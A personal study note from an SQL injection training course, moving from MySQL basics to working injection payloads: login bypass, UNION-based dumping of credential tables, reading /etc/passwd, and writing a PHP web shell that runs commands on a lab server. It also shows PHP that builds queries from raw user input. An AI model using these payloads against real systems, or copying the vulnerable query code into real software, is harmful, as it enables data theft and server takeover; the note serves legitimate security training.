# 8.SQL Injection Fundamentals

[Practice](8%20SQL%20Injection%20Fundamentals%2019d1099e6b5c8083a030c68f5fb019fb/Practice%2019e1099e6b5c800b9112c7e56016267d.md)

As HTTP(S) requests arrive from the user, the web application's back-end will issue queries to the database to build the response.

A SQL injection occurs when a malicious user attempts to pass input that changes the final SQL query sent by the web application to the database, enabling the user to perform other unintended SQL queries directly against the database.

1- First, the attacker has to inject code outside the expected user input limits, so it does not get executed as simple user input.

In the simplest form, this can be done using `‘` or `“` 

Used to access data, but another use case is to bypass authentication methods. 

A Schema is a template. 

### **Intro to MySQL**

The `mysql` utility is used to authenticate to and interact with a MySQL/MariaDB database. 

The `-u` flag is used to supply the username and the `-p` flag for the password. The `-p` flag should be passed empty, so we are prompted to enter the password

`Loupeed@htb[/htb]$ mysql -u root -pEnter password: <password>`

When we do not specify a host, it will default to the `localhost` server. We can specify a remote host and port using the `-h` and `-P` flags.
`Loupeed@htb[/htb]$ mysql -u root -h docker.hackthebox.eu -P 3306 -p` 

 The default MySQL/MariaDB port is (3306),

Create a database:
`CREATE DATABASE users;`

View the list of database:
`SHOW DATABASES;`

DBMS stores data in the form of tables.

Create a table:

```sql
CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );

```

To see the Table inside a database:
`SHOW TABLES;`

List the table structure with its fields and data types.
`DESCRIBE logins;` where login is the table name. 

Make sure a column will have unique value:

`username VARCHAR(100) UNIQUE NOT NULL,`

Final example of a table creation:

```sql
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );

```

### **SQL Statements**

`INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);`

To skip some value use the following syntax:
`INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);`

Example:
`mysql> INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');`

We can use ALTER to change the name of any table and any of its fields or to delete or add a new column to an existing table.
`mysql> ALTER TABLE logins ADD newColumn INT;`
`mysql> ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;`
`ALTER TABLE logins DROP newerColumn;`

While `ALTER` is used to change a table's properties, the UPDATE statement can be used to update specific records within a table, based on certain conditions.
`UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;`

To use a database do:

`USE DATABASE NAME;`

Sort a table:

We can sort the results of any query using ORDER BY and specifying the column to sort by. 

We can limit the number of result with `LIMIT` in case the results are too many. 

`WHERE` to use to specify a condition. 
`mysql> SELECT * FROM logins WHERE id > 1;`

To match specific pattern use `LIKE`:
`SELECT * FROM logins WHERE username LIKE 'admin%';` Here start with admin. 

To match a specific number of character we can the the `‘_’` with `LIKE`. 

Example:

`SELECT * FROM logins WHERE username like '___';`

The use of operator, `OR`, `AND` , and `NOT.` 

Example:
`SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;`

`SELECT COUNT(*) FROM titles  WHERE emp_no>10000 OR title NOT LIKE "%Engineer%";`

### Intro to SQL injection:

For example, within a `PHP` web application, we can connect to our database, and start using the `MySQL` database through `MySQL` syntax, right within `PHP`, as follows:

```php
$conn = new mysqli("localhost", "root", "password", "users");
$query = "select * from logins";
$result = $conn->query($query);
```

Search input fields are used to retrieve data from the database.

```php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

Injection happen when an app interpret user input as code, and not as string. 

```bash
$query = "select * from logins where username like '%$searchInput'";
**Here if we input  1'; DROP TABLE usersl'**

```

### **Subverting Query Logic:**

First we have to test if the application is vulnerable to an SQL injection. Replace any value with the following list:

| `'` | `%27` |
| --- | --- |
| `"` | `%22` |
| `#` | `%23` |
| `;` | `%3B` |
| `)` | `%29` |

In some case we will use the URL so the encoded version on the right. 

**Abuse of the OR operator:**
`admin' or '1'='1`

Remove the last quote and use ('1'='1), so the remaining single quote from the original query would be in its place.

This would be the final query that the website will treat, always true. 

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

Here it is working because admin is a valid username but sometimes you don’t know. 

A solution is to use another OR.

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something' OR '1'='1';
```

### **Using Comments:**

In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, so the comment starts with `(-- )`, with a space at the end. This is sometimes URL encoded as `(--+)`, as spaces in URLs are encoded as `(+)`. 

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

This code return true since the user admin exist. 

### **Union Clause**

Used in search field 

The Union clause is used to combine results from multiple `SELECT` statements.

A `UNION` statement can only operate on `SELECT` statements with an equal number of columns.

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

If the second part after the Union does not have the same number of column we have to use junk data. 

```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

Here the table products has 2 columns, then we create a junk value of 2 for the Union. 
Also the datatype has to be the same. 

Code snipped from exercise.

```sql
SELECT COUNT(*)
FROM (SELECT first_name FROM employees UNION ALL SELECT dept_name FROM departments) AS combined;
```

### **Union Injection:**

Before going ahead and exploiting Union-based queries, we need to find the number of columns selected by the server.

- Using `ORDER BY`
- Using `UNION`

Try one by one this query until it is not working.
`' order by 1-- -`

We are adding an extra dash (-) at the end, to show you that there is a space after (--).

`' order by 2-- -`

`' order by 3-- -`

`' order by 4-- -` Error so we know that we have only 3 columns. 

The other method is using the Union with different table number until we have an error
`cn' UNION select 1,2,3-- -`
`cn' UNION select 1,2,3,4-- -`

The number are constant value that you inject in it. 

**Now that we know the number of column, we can do our injection.** 

It is very common that not every column will be displayed back to the user. Therefore the injection has to be place in the right column. As an example:

`cn' UNION select 1,2,3,4-- -`

![image.png](8%20SQL%20Injection%20Fundamentals%2019d1099e6b5c8083a030c68f5fb019fb/image.png)

Only column 2,3,4 are printed. Therefore injection should be place into one of them.

To test this:
`cn' UNION select 1,@@version,3,4-- -`

![image.png](8%20SQL%20Injection%20Fundamentals%2019d1099e6b5c8083a030c68f5fb019fb/image%201.png)

## **Exploitation:**

### **1- Database Enumeration**

Before enumerating the database, we usually need to identify the type of DBMS we are dealing with.

In fact, each dbms has different queries. If the http response is `nginx` or `Apache` there is a good chance the database is running on linux, so the DBMS is likely Mysql. 

if the server is IIS, then likely MSSQL.

**Fingerprint command with MySQL:**

`SELECT @@version`

`SELECT POW(1,1)`

`SELECT SLEEP(5)`

![image.png](8%20SQL%20Injection%20Fundamentals%2019d1099e6b5c8083a030c68f5fb019fb/image%202.png)

**INFORMATION_SCHEMA Database:**

In order to use our `UNION` injection we need to have information about the tables, columns, and about the different databases. 

This is where we can utilize the `INFORMATION_SCHEMA` Database.

To reference a table present in another DB, we can use the dot ‘`.`’ operator.

```sql
SELECT * FROM my_database.users;
```

The table SCHEMATA in the `INFORMATION_SCHEMA` database contains information about all databases on the server. It is  used to obtain database names so we can then query them. The `SCHEMA_NAME` column contains all the database names currently present.

```sql
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| ilfreight          |
| dev                |
+--------------------+
```

In mysql, `mysql, information_schema,performance_schema` are default databases.

To find which database the field search use, use the `database()`.

```sql
cn' UNION select 1,database(),2,3-- -
```

**TABLES:**

To find all tables within a database, we can use the `TABLES` table in the `INFORMATION_SCHEMA` Database. This is used to find the tables names in the dev database. 

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

**COLUMNS:**

Now that we have the tables name, we can find the columns name for the table we are interested in. 

Column name can be found in the  `COLUMNS` table in the `INFORMATION_SCHEMA` database. 

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

**Data:**

Now that we have the Databases, the table, and the columns, we can retrieved the data. 

```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

`dev` is the database, and `credentials` is the table name. 

### **2- Reading Files**

SQL Injection can also be leveraged to perform many other operations, such as reading and writing files on the server and even gaining remote code execution on the back-end server.

The `FILE` privilege is specifically related to reading from and writing to the file system on the server where the MySQL database is running. 

1- Determine which use we are on the database

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

Union Injection 
`cn' UNION SELECT 1, user(), 3, 4-- -`

or 
`cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -`

2- See if we are super user privilege
`SELECT super_priv FROM mysql.user`

In the payload 
`cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -`

or if too many users
`cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`

If the query return `‘Y’` then it means Yes. 

3- See all the privilege we have 

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

To show our privilege use the user we found in step 1

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

If the `FILE` privilege is written, then we ca read files and potentially write files. It means reading local system files. 

4- Read file with the function LOAD_FILE(). 

It takes one argument which is the file name. 

`SELECT LOAD_FILE('/etc/passwd');`

To use this in the injection:
`cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`

Other example to show the source code of a website page:

The default Apache webroot is `/var/www/html`.

Read the source code of the file at `/var/www/html/search.php`.

`cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`

**To see the source code use CTRL+U.** 

### **3- Writing Files:**

**Write File Privileges**

Writing file in the back end server is much more restricted in modern DBMS because we can use this to write a web shell on the remote server. Most of them disable this by defaults. 

1- Check if we have the privileges to write files.

Have the File privilege

MySLQ global `secure_file_priv` variable not enable.

Write access to the location we want to write on the back end server. 

The `secure_file_priv` is used to determine where we can read/write file from. When empty we can do it everywhere. NULL means we can not from any directory. 

MariaDB has this variable empty by default so only the FILE priv will be sufficient. 

MySQL use `/var/lib/mysql-files` as the default folder, therefore reading file through a MySQL injection is not possible with the default settings. 

To find the value of this variable we use the following query:

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

With the previous exercise:

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

If the variable_value is empty then we are okay to go. 

### **SELECT INTO OUTFILE:**

The function INTO OUTFILE is used to write data into file. 

`SELECT * from users INTO OUTFILE '/tmp/credentials';`

This will write the data into the file credentials. 

We can also select string and write them into a file:
`SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';`

**This create the file.txt** 

### **Writing Files through SQL Injection:**

For web shell we need to find the base web directory for the web server. We can use the load_file to read the server configuration:

Apache:`/etc/apache2/apache2.conf`

Nginx:`/etc/nginx/nginx.conf`

ISS:`%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`

If none of this work, we can do a fuzzing. 

SQL with the UNION Injection:

```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

If there are no error, then it works

http://website/proof.txt should show the message 

Now we can write a php webshell:
`<?php system($_REQUEST[0]); ?>`

**SQL injection:**

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

No the command we have to type are in the url:

`http://SERVER_IP:PORT/shell.php?0=id` example with the id command. 

To find the flag

`http://94.237.56.156:41489/shell.php?0=cd ..;ls;cat%20flag.txt`

![image.png](8%20SQL%20Injection%20Fundamentals%2019d1099e6b5c8083a030c68f5fb019fb/image%203.png)